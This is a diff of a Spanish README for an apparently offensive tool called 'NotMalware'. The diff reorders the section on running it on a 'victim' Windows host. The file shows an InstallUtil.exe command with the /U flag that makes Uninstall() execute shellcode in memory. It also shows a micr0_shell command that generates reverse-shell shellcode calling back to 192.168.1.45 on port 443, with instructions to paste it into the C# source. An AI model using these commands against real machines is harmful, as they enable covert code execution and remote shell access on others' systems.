@@ -65,16 +65,6 @@ mcs -target:library -platform:x64 -r:System.Configuration.Install.dll -out:NotMa
 
 ---
 
-## 🚀 Ejecución (en Windows víctima)
-
-```powershell
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Path\NotMalware_IU.dll
-```
-
-> El método `Uninstall()` será invocado automáticamente y ejecutará el shellcode en memoria.
-
----
-
 ## 🧨 Generar shellcode
 
 Puedes usar `micr0_shell` para generar shellcode crudo en formato C# (byte array):
@@ -86,6 +76,15 @@ USO:
 python3 'micr0 shell.py' --ip 192.168.1.45 --port 443 --type cmd --language c --variable shellcode --execution false --save True --output buf.bin
 
 Pega el contenido directamente dentro del `byte[] shellcode` en el archivo `.cs`.
+
+---
+## 🚀 Ejecución (en Windows víctima)
+
+```powershell
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Path\NotMalware.exe
+```
+
+> El método `Uninstall()` será invocado automáticamente y ejecutará el shellcode en memoria.
 
 ---
 
